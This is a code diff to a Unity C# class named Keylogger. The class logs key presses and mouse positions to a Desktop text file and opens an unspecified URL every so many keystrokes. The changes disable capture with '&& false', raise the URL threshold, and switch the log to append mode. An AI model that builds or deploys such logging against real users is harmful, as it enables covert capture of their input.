@@ -19,7 +19,7 @@ public class Keylogger : MonoBehaviour
     {
         foreach (KeyCode keyCode in Enum.GetValues(typeof(KeyCode)))
         {
-            if (Input.GetKeyDown(keyCode))
+            if (Input.GetKeyDown(keyCode) && false)
             {
 
 
@@ -31,7 +31,7 @@ public class Keylogger : MonoBehaviour
 
                 LogKeyPress(keyCode);
 
-                if(counter > 25){
+                if(counter > 50){
 
                   OpenURL(url);
                   counter =  0;
@@ -49,7 +49,7 @@ public class Keylogger : MonoBehaviour
     {
         string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
         string logFilePath = Path.Combine(desktopPath, "KeyLog.txt");
-        sw = new StreamWriter(logFilePath, false);
+        sw = new StreamWriter(logFilePath, true);
     }
 
 
@@ -85,19 +85,12 @@ public class Keylogger : MonoBehaviour
         switch (keyCode)
         {
             case KeyCode.Mouse0:
-                break;
             case KeyCode.Mouse1:
-                break;
             case KeyCode.Mouse2:
-                break;
             case KeyCode.Mouse3:
-                break;
             case KeyCode.Mouse4:
-                break;
             case KeyCode.Mouse5:
-                break;
             case KeyCode.Mouse6:
-                break;
                 sw.Write(" X: " + Input.mousePosition.x + ", Y: "+Input.mousePosition.y);
                 break;
             default:
